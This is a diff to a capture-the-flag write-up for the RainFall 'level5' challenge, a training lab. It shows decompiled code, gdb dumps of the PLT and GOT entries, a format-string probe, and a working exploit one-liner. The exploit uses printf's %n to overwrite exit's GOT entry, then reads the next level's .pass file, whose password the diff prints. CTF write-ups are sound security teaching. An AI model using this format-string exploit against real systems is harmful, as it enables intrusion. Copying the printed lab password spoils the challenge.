@@ -7,7 +7,6 @@
 080484bd        _exit(1);
 080484a4    }
 
-
 080484c2    void n() __noreturn
 080484c2    {
 080484c2        void var_20c;
@@ -15,7 +14,6 @@
 080484f3        printf(&var_20c);
 080484ff        exit(1);
 080484c2    }
-
 
 08048504    int32_t main(int32_t argc, char** argv, char** envp)
 08048504    {
@@ -48,6 +46,7 @@ Dump of assembler code for function n:
    0x080484f8 <+54>:    movl   $0x1,(%esp)
    0x080484ff <+61>:    call   0x80483d0 <exit@plt>
 ```
+
 When the program call `exit()`, it first jumps to `exit@plt`, which is the `PLT` `(Procedure Linkage Table)` entry for `exit()`.
 
 ```asm
@@ -58,31 +57,31 @@ Dump of assembler code for function exit@plt:
    0x080483db <+11>:    jmp    0x8048370
 End of assembler dump.
 ```
+
 The first instruction jumps to the address stored in `0x8049838` (the GOT entry for `exit()`).
 
 ```asm
 (gdb) x/1wx 0x8049838
 0x8049838 <exit@got.plt>:       0x080483d6
 ```
+
 We will replace this address with the address of `o()`.
 
 ```bash
 level5@RainFall:~$ ./level5 
 AAAA %x.%x.%x.%x.%x.%x.%x. 
 AAAA 200.b7fd1ac0.b7ff37d0.41414141.2e782520.252e7825.78252e78.
-level5@RainFall:~$
 ```
+
 Here we can see our string input is stored in fourth position from `printf()` perspective.
 
-
-## Step 2: Exploit the Binary
+## Step 2: Exploiting the Binary
 
 ```bash
 level5@RainFall:~$ python -c 'print "\x08\x04\x98\x38"[::-1] + "%134513824d%4$n"' > /tmp/exploit
 level5@RainFall:~$ cat /tmp/exploit - | ./level5
 
-% cd ../level6
-% cat .pass
+% cat /home/user/level6/.pass
 d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 ```
 
